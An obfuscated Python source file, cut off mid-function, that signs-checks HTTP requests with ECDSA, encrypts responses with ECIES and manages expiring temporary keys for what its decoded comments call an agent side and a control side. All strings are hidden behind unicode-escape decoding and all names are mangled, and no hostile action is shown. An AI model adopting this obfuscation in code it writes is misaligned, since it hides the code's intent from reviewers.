class Logger:
    codecs.decode('\\u65e5\\u5fd7\\u5904\\u7406\\u5668', 'unicode_escape')
    if Config.DEBUG:
        _log_level = 1
    else:
        _log_level = 0

    @classmethod
    def set_log_level(cls, level: int):
        cls._log_level = level

    @classmethod
    def _log(cls, message: str, level: str=codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape')):
        if cls._log_level == 0 and level != codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            return
        O0_var_42 = datetime.now().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0020\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053', 'unicode_escape'))
        O0_var_43 = codecs.decode('\\u005b', 'unicode_escape') + str(O0_var_42) + codecs.decode('\\u005d\\u0020\\u005b', 'unicode_escape') + str(level) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(message)
        if level == codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            print(O0_var_43, file=sys.stderr)
        else:
            print(O0_var_43)

    @classmethod
    def debug(cls, message: str, debug_level: int=1):
        if cls._log_level == debug_level:
            cls._log(message, codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'))

    @classmethod
    def info(cls, message: str):
        cls._log(message, codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape'))

    @classmethod
    def warning(cls, message: str):
        cls._log(message, codecs.decode('\\u0057\\u0041\\u0052\\u004e\\u0049\\u004e\\u0047', 'unicode_escape'))

    @classmethod
    def error(cls, message: str):
        cls._log(message, codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'))

def O0_fn_1(method: str, path: str, O0_var_44: str, nonce: str, O0_var_45: str) -> str:
    if not O0_var_44:
        O0_var_44 = hashlib.sha256(b'').hexdigest()
    return str(method) + codecs.decode('\\u000a', 'unicode_escape') + str(path) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_44) + codecs.decode('\\u000a', 'unicode_escape') + str(nonce) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_45)

class CryptoManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u52a0\\u5bc6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u4ee3\\u7406\\u7aef\\u4e13\\u7528\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u53ea\\u6301\\u6709\\u516c\\u94a5\\uff0c\\u4e0d\\u5b58\\u50a8\\u4efb\\u4f55\\u79c1\\u94a5\\u002f\\u654f\\u611f\\u4fe1\\u606f\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u63d0\\u4f9b\\u7b7e\\u540d\\u9a8c\\u8bc1\\u548c\\u54cd\\u5e94\\u52a0\\u5bc6\\u80fd\\u529b\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_46: str, O0_var_47: str):
        self.ecdsa_vk = self._load_ecdsa_pubkey(O0_var_46)
        self.ecies_pubkey = None
        if O0_var_47 and O0_var_47.strip():
            O0_var_48 = O0_var_47.strip()
            try:
                if len(O0_var_48) > 32 and (not all((O0_var_49 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_49 in O0_var_48))):
                    self.ecies_pubkey = base64.b64decode(O0_var_48)
                else:
                    self.ecies_pubkey = bytes.fromhex(O0_var_48)
            except Exception:
                self.ecies_pubkey = O0_var_48.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_48, str) else O0_var_48
            if len(self.ecies_pubkey) not in (33, 65):
                Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u0020\\u8b66\\u544a\\u003a\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u957f\\u5ea6\\u5f02\\u5e38\\u0020\\u0028', 'unicode_escape') + str(len(self.ecies_pubkey)) + codecs.decode('\\u5b57\\u8282\\u0029\\u002c\\u0020\\u52a0\\u5bc6\\u53ef\\u80fd\\u5931\\u8d25', 'unicode_escape'))

    @staticmethod
    def _load_ecdsa_pubkey(pem_or_der: str) -> VerifyingKey:
        O0_var_50 = pem_or_der.strip()
        if codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape') in O0_var_50:
            try:
                return VerifyingKey.from_pem(O0_var_50)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0050\\u0045\\u004d\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        try:
            O0_var_51 = codecs.decode('', 'unicode_escape').join(O0_var_50.split())
            O0_var_52 = base64.b64decode(O0_var_51, validate=True)
        except (binascii.Error, ValueError):
            O0_var_52 = O0_var_50.encode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u0031', 'unicode_escape'))
        try:
            return VerifyingKey.from_der(O0_var_52)
        except Exception:
            pass
        if len(O0_var_52) in (33, 65) and O0_var_52[0] in (2, 3, 4):
            try:
                return VerifyingKey.from_string(O0_var_52, curve=TEMP_ECDSA_CURVE)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0072\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u002f\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        raise ValueError(codecs.decode('\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006c\\u006f\\u0061\\u0064\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u002e\\u0020\\u0050\\u006c\\u0065\\u0061\\u0073\\u0065\\u0020\\u0063\\u0068\\u0065\\u0063\\u006b\\u003a\\u000a\\u0031\\u002e\\u0020\\u0050\\u0045\\u004d\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u0028\\u0073\\u0074\\u0061\\u0072\\u0074\\u0073\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u0027\\u0029\\u000a\\u0032\\u002e\\u0020\\u0053\\u0074\\u0061\\u006e\\u0064\\u0061\\u0072\\u0064\\u0020\\u0058\\u002e\\u0035\\u0030\\u0039\\u0020\\u0044\\u0045\\u0052\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0033\\u002e\\u0020\\u0052\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u0020\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0033\\u0033\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u006f\\u0072\\u0020\\u0055\\u006e\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0050\\u0072\\u006f\\u0076\\u0069\\u0064\\u0065\\u0064\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0064\\u0029\\u003a\\u0020', 'unicode_escape') + str(len(O0_var_52)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u002e', 'unicode_escape'))

    @staticmethod
    def validate_ecies_pubkey(pubkey_b64: str) -> bytes:
        if not pubkey_b64 or not pubkey_b64.strip():
            raise ValueError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0069\\u0073\\u0020\\u0065\\u006d\\u0070\\u0074\\u0079', 'unicode_escape'))
        O0_var_53 = pubkey_b64.strip()
        try:
            if len(O0_var_53) > 32 and (not all((O0_var_54 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_54 in O0_var_53))):
                O0_var_55 = codecs.decode('', 'unicode_escape').join(O0_var_53.split())
                O0_var_56 = base64.b64decode(O0_var_55, validate=True)
            else:
                O0_var_56 = bytes.fromhex(O0_var_53)
        except Exception as e:
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        if len(O0_var_56) not in (33, 65):
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020', 'unicode_escape') + str(len(O0_var_56)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u003b\\u0020\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0033\\u0033\\u0020\\u006f\\u0072\\u0020\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'))
        return O0_var_56

    def verify_signature(self, method: str, path: str, O0_var_57: str, nonce: str, O0_var_58: str, O0_var_59: str) -> bool:
        try:
            O0_var_60 = int(O0_var_58)
            O0_var_61 = int(time.time())
            if abs(O0_var_61 - O0_var_60) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_61 - O0_var_60)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_62 = O0_fn_1(method, path, O0_var_57, nonce, O0_var_58).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_63 = hashlib.sha256(O0_var_62)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_62))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_63.hexdigest()))
        try:
            O0_var_64 = base64.b64decode(O0_var_59)
            O0_var_65 = len(O0_var_64)
            if O0_var_65 == 64:
                O0_var_66 = sigdecode_string
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            elif O0_var_65 > 64 and O0_var_64[0] == 48:
                O0_var_66 = sigdecode_der
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0044\\u0045\\u0052\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            else:
                O0_var_66 = sigdecode_der
            self.ecdsa_vk.verify(O0_var_64, O0_var_62, hashfunc=hashlib.sha256, sigdecode=O0_var_66)
        except BadSignatureError:
            Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u574f\\u7b7e\\u540d', 'unicode_escape'))
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        return True

    def identify_signer(self, method: str, path: str, O0_var_67: str, nonce: str, O0_var_68: str, O0_var_69: str, O0_var_70: Optional[VerifyingKey]=None) -> str:
        try:
            O0_var_71 = int(O0_var_68)
            O0_var_72 = int(time.time())
            if abs(O0_var_72 - O0_var_71) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_72 - O0_var_71)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_73 = O0_fn_1(method, path, O0_var_67, nonce, O0_var_68).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_74 = hashlib.sha256(O0_var_73)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_73))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_74.hexdigest()))
        if self._verify_with(self.ecdsa_vk, O0_var_69, O0_var_73):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u0028\\u63a7\\u5236\\u7aef\\u9759\\u6001\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')
        if O0_var_70 is not None and self._verify_with(O0_var_70, O0_var_69, O0_var_73):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0074\\u0065\\u006d\\u0070\\u0020\\u0028\\u4e34\\u65f6\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape')
        Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u9759\\u6001\\u5bc6\\u94a5\\u4e0e\\u4e34\\u65f6\\u5bc6\\u94a5\\u5747\\u4e0d\\u5339\\u914d', 'unicode_escape'))
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))

    @staticmethod
    def _verify_with(vk: VerifyingKey, auth_token: str, message: bytes) -> bool:
        try:
            O0_var_75 = base64.b64decode(auth_token)
            O0_var_76 = len(O0_var_75)
            if O0_var_76 == 64:
                O0_var_77 = sigdecode_string
            elif O0_var_76 > 64 and O0_var_75[0] == 48:
                O0_var_77 = sigdecode_der
            else:
                O0_var_77 = sigdecode_der
            vk.verify(O0_var_75, message, hashfunc=hashlib.sha256, sigdecode=O0_var_77)
            return True
        except BadSignatureError:
            return False
        except Exception:
            return False

    def encrypt_response(self, data: Dict[str, Any], O0_var_78: Optional[bytes]=None) -> str:
        O0_var_79 = O0_var_78 or self.ecies_pubkey
        if Config.DEBUG or not O0_var_79:
            return json.dumps(data, ensure_ascii=False, default=str)
        try:
            O0_var_80 = json.dumps(data, ensure_ascii=False, default=str).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
            O0_var_81 = ecies_encrypt(O0_var_79, O0_var_80)
            return base64.b64encode(O0_var_81).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
        except Exception as e:
            O0_var_82 = {codecs.decode('\\u005f\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e), codecs.decode('\\u005f\\u0072\\u0061\\u0077', 'unicode_escape'): data if Config.DEBUG else None}
            return json.dumps(O0_var_82, ensure_ascii=False, default=str)

    def decrypt_data(O0_var_83: str, key: bytes):
        try:
            O0_var_84 = json.loads(base64.b64decode(O0_var_83).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_85 = base64.b64decode(O0_var_84[codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape')])
            O0_var_86 = base64.b64decode(O0_var_84[codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape')])
            O0_var_87 = base64.b64decode(O0_var_84[codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')])
            O0_var_88 = AES.new(key, AES.MODE_GCM, nonce=O0_var_85)
            O0_var_89 = O0_var_88.decrypt_and_verify(O0_var_87, O0_var_86)
            return O0_var_89.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        except ValueError:
            Logger.error(codecs.decode('\\u274c\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff1a\\u6570\\u636e\\u53ef\\u80fd\\u88ab\\u7be1\\u6539\\u6216\\u5bc6\\u94a5\\u9519\\u8bef', 'unicode_escape'))
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u274c\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(e))
            return None
crypto = None

def O0_fn_2():
    global crypto
    if crypto is None:
        crypto = CryptoManager(Config.ECDSA_PUBLIC_KEY_PEM, Config.ECIES_PUBLIC_KEY_PEM)
    return crypto

def _generate_ecies_keypair() -> Tuple[bytes, bytes]:
    try:
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_90 = SECP256k1.order
        while True:
            O0_var_91 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_91, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < O0_var_90:
                O0_var_92 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_91, curve=SECP256k1).get_verifying_key().to_string()
                return (O0_var_91, O0_var_92)
    except Exception:
        pass
    try:
        from ecies.keys import PrivateKey as EciesPrivateKey
        O0_var_93 = EciesPrivateKey(codecs.decode('\\u0073\\u0065\\u0063\\u0070\\u0032\\u0035\\u0036\\u006b\\u0031', 'unicode_escape'))
        return (O0_var_93.secret, O0_var_93.public_key.to_bytes())
    except Exception:
        pass
    try:
        try:
            from ecies.utils import generate_keypair
            O0_var_94, O0_var_95 = generate_keypair()
        except Exception:
            from ecies.utils import generate_eth_key
            O0_var_96 = generate_eth_key()
            O0_var_94, O0_var_95 = (O0_var_96.public_key.to_hex(), O0_var_96.to_hex())
        O0_var_92 = bytes.fromhex(O0_var_94[2:] if O0_var_94.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_94)
        O0_var_97 = bytes.fromhex(O0_var_95[2:] if O0_var_95.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_95)
        return (O0_var_97, O0_var_92)
    except Exception as e:
        raise RuntimeError(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u0070\\u0079\\u0020\\u5bc6\\u94a5\\u751f\\u6210\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
TEMP_ECDSA_CURVE = NIST256p

def _ecdsa_private_pkcs8_pem(O0_var_98: 'SigningKey') -> str:
    try:
        O0_var_99 = O0_var_98.to_der(format=codecs.decode('\\u0070\\u006b\\u0063\\u0073\\u0038', 'unicode_escape'))
    except (TypeError, ValueError):
        return O0_var_98.to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    O0_var_100 = base64.b64encode(O0_var_99).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
    O0_var_101 = codecs.decode('\\u000a', 'unicode_escape').join((O0_var_100[O0_var_102:O0_var_102 + 64] for O0_var_102 in range(0, len(O0_var_100), 64)))
    return codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u000a', 'unicode_escape') + str(O0_var_101) + codecs.decode('\\u000a\\u002d\\u002d\\u002d\\u002d\\u002d\\u0045\\u004e\\u0044\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape')

class TempKeyManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u7ba1\\u7406\\u5668\\u0020\\u0028\\u7ebf\\u7a0b\\u5b89\\u5168\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u540c\\u4e00\\u65f6\\u523b\\u4ec5\\u7ef4\\u62a4\\u4e00\\u4efd\\u6709\\u6548\\u4e34\\u65f6\\u5bc6\\u94a5\\u5bf9\\uff0c\\u907f\\u514d\\u5185\\u90e8\\u591a\\u5934\\u5bc6\\u94a5\\u7ba1\\u7406\\u8d1f\\u62c5\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u6709\\u6548\\u671f\\u5185\\u91cd\\u590d\\u67e5\\u8be2\\u8fd4\\u56de\\u540c\\u4e00\\u5bc6\\u94a5\\u5bf9\\uff1b\\u8fc7\\u671f\\u540e\\u81ea\\u52a8\\u751f\\u6210\\u65b0\\u7684\\u5bc6\\u94a5\\u5bf9\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u4e34\\u65f6\\u6301\\u6709\\u8005\\u003a\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0050\\u002d\\u0032\\u0035\\u0036\\u0020\\u79c1\\u94a5\\u7b7e\\u540d\\u8bf7\\u6c42\\u002c\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u89e3\\u5bc6\\u54cd\\u5e94\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self):
        self._lock = threading.Lock()
        self._key: Optional[Dict[str, Any]] = None
        self.on_expired = None

    def get_or_create(self, O0_var_103: int) -> Dict[str, Any]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key
            self._key = self._generate(O0_var_103)
            Logger.info(codecs.decode('\\U0001f511\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u65b0\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u751f\\u6210\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(self._key['key_id']) + codecs.decode('\\u002c\\u0020\\u6709\\u6548\\u671f\\u0020', 'unicode_escape') + str(O0_var_103) + codecs.decode('\\u0020\\u5c0f\\u65f6', 'unicode_escape'))
            return self._key

    def get_active_ecdsa_vk(self) -> Optional[VerifyingKey]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'))
            return None

    def get_active_ecies_pub(self) -> Optional[bytes]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'))
            return None

    def _expire_current_locked(self):
        if self._key and self._is_expired(self._key):
            O0_var_104 = self._key[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')]
            self._key = None
            Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u8fc7\\u671f\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(O0_var_104))
            O0_var_105 = self.on_expired
            if O0_var_105:
                try:
                    O0_var_105()
                except Exception as e:
                    Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u8fc7\\u671f\\u8f6e\\u6362\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    def _is_expired(self, key: Dict[str, Any]) -> bool:
        return int(time.time()) >= key[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]

    def _generate(self, O0_var_106: int) -> Dict[str, Any]:
        O0_var_107 = SigningKey.generate(curve=TEMP_ECDSA_CURVE)
        O0_var_108 = _ecdsa_private_pkcs8_pem(O0_var_107)
        O0_var_109 = O0_var_107.get_verifying_key().to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_110, O0_var_111 = _generate_ecies_keypair()
        O0_var_112 = int(time.time())
        O0_var_113 = int(O0_var_106) * 3600
